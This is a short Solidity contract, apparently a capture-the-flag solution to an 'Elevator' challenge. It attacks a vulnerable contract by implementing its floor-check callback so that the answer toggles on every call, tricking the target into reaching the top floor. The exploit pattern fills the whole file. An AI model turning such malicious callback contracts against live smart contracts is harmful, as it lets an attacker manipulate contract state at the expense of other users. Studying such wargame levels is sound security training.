// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract AttackElevator {
    Elevator immutable victim;
    bool public lastFloor;

    constructor(Elevator _victim) {
        victim = _victim;
        lastFloor = true;
    }

    function attack() external {
        victim.goTo(1);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        _floor;
        lastFloor = !lastFloor;
        return lastFloor;
    }
}
